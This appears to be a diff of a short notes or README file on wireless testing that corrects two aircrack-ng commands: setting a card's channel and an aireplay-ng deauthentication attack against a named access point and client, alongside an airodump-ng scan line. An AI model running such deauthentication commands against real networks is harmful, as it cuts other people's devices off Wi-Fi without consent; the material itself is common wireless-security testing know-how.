@@ -11,7 +11,7 @@ airodump-ng wlan0 --band bg --manufacturer --beacons --showack
 ```
 
 ```bash
-iwconfig wlan1 channel
+iwconfig wlan1 channel 4
 
-aireplay-ng -0 99 -a SOURCE -c TARGET wlan1
+aireplay-ng -0 99 -a BSSID -c TARGET wlan1
 ```
